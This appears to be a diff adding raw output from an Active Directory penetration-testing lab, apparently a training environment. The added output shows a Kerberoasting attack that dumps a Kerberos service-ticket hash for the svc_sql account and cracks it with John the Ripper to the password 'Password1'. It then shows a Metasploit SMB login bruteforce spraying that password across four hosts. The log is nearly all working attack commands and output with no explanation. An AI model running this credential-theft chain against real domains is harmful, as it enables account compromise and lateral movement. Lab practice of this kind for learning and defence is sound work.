@@ -207,3 +207,48 @@ USER CLAIMS INFORMATION
 User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
+
+
+/get_user_spns
+[*] Running for 10.13.37.10...
+[*] Total of records returned 4
+[+] ServicePrincipalName               Name     MemberOf  PasswordLastSet      LastLogon           
+[+] ---------------------------------  -------  --------  -------------------  -------------------
+[+] MSSQLSvc/WAD-SQL01.WAD.local:1433  svc_sql            2020-03-02 10:15:54  2020-03-04 18:20:35 
+[-] Exception for getKerberosTGT
+[+] $krb5tgs$23$*svc_sql$WAD.LOCAL$MSSQLSvc/WAD-SQL01.WAD.local~1433*$cf66d70c3863d4d0abfaaa8a4eac4454$ac6767348999c1c898e2cb6acb60d40a7aeb8101caa9ff344f9e05547c0d307b76304165c1c0745427e8b44c0e55e93051f2bf8ff6247bc5af814c3977d8c67d8f4abf3bab387aa70e766fc11719ddbe69ee2aa750da0980aaf0dfa09fe9b42e7265a7f42e4fd75a27bd5234a450672aeb380270e65640bb03b80d97ab56044d51ee651c3eedf51259babb07fd1429244bd2ec48318f4574cb9d485723a0b97c639adae84e2be26ad1450ee0ae5ccf70fb458aedfd020c7efa7fb728844e172e23ac066c437db65a357d485211fa7e1431454964ef2aeadbb3f32474de78e2153a67799aa7a911d684360004ccaa8940ec3ae96d0354ea3bac03444f13bab34bcf4dfc32c3a2f9a8dafe371ccdac4c34409e6c806dc88923317861dcf5e843d53b12be32dc1a4e0f7d7406e87a4ea2d9d46e971d3e25cbe8b1563be0c027415181b75e45bd499ef5619baf20f611b5fc33cc692704d539afe5838d2b5cdb07d0d1b5beb11747de435c755dcc3915eef03086b94c2f59435f3b07b967f01ee46203704555e080246751e916c7991a3f1f9d58fc46321e878f653056296113b1e252d88c9ce14ba57aa4c0294a7f9ee8c41e80b8603d3c571b110654eca40a59840bfb389d31b464771d9fc7e44f4b3db8e8ef7c88a11291ad63028b961b1df90fd896f0d021dfe416453b2ff137ac19114c163e5c62817f02977b1081d07f9866e387d1176dc07110622403c08aadf778d554d1a9078c35feb0b97a465b167557d26539de922053d1a428bbc791d0ec1ad9c176a6dac2fd23a9386c43def663526182b3739c822c436127aebf4c5c1859632f7f69c15a051e30ddee7859a7da85b980433de45cd81ec7b1a3d7db7074043fcefa6ff5ce9ff9a2827a0b55fff6be0c9a88a253de29d2f966343b6e5d86cf11ae16fadba061b41e230befb82a998755400f0bee196ed9636340d1aca312c16eb2e3db715b70c1d2c4414ded612067ff690923e70a6a5f0a97abfee4960e424e415e0f91ed49b1925cd92a1faba6e70a800a63270700c3d9e495a8375799a55bce4bf6f66f9f8b41ec856c6283d470000fdb24dace42fd8a07cdb6e0b8b015cca5df0640a0f6bf0f7e37078399b92255fc3f9040b82776d2bb1a4c4931fb46e0e7a5515a1f2866e5d1acb20046a34dc540b650023fb2da8138ac8e1137d5e4a6bec94e19e6109815be579bafa76fc65fc7d35144654ea488512be36ea4b2e042eaf2e1d3c8387b367e1f4e397871835083f5db3e3853db7c504da8310165b6482de6a595091d6c94f77e
+
+
+/john
+"hash" [New] 3L, 1948C written
+training_cloud@wad-kali02:~$ /opt/john/run/john --format=krb5tgs hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/opt/john/run/password.lst
+Password1        (?)
+1g 0:00:00:00 DONE 2/3 (2020-03-09 14:45) 50.00g/s 204800p/s 204800c/s 204800C/s modem..Peter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+training_cloud@wad-kali02:~$ /opt/john/run/john --format=krb5tgs --show hash
+?:Password1
+
+/Q22
+[*] 10.13.37.20:445       - 10.13.37.20:445 - Starting SMB login bruteforce
+[-] 10.13.37.20:445       - 10.13.37.20:445 - Failed: 'wad.local\svc_sched:Password1',
+[*] Scanned 1 of 4 hosts (25% complete)
+[*] 10.13.37.10:445       - 10.13.37.10:445 - Starting SMB login bruteforce
+[-] 10.13.37.10:445       - 10.13.37.10:445 - Failed: 'wad.local\svc_sched:Password1',
+[*] Scanned 2 of 4 hosts (50% complete)
+[*] 10.13.37.12:445       - 10.13.37.12:445 - Starting SMB login bruteforce
+[-] 10.13.37.12:445       - 10.13.37.12:445 - Failed: 'wad.local\svc_sched:Password1',
+[*] Scanned 3 of 4 hosts (75% complete)
+[*] 10.13.37.11:445       - 10.13.37.11:445 - Starting SMB login bruteforce
+[-] 10.13.37.11:445       - 10.13.37.11:445 - Failed: 'wad.local\svc_sched:Password1',
+[*] Scanned 4 of 4 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
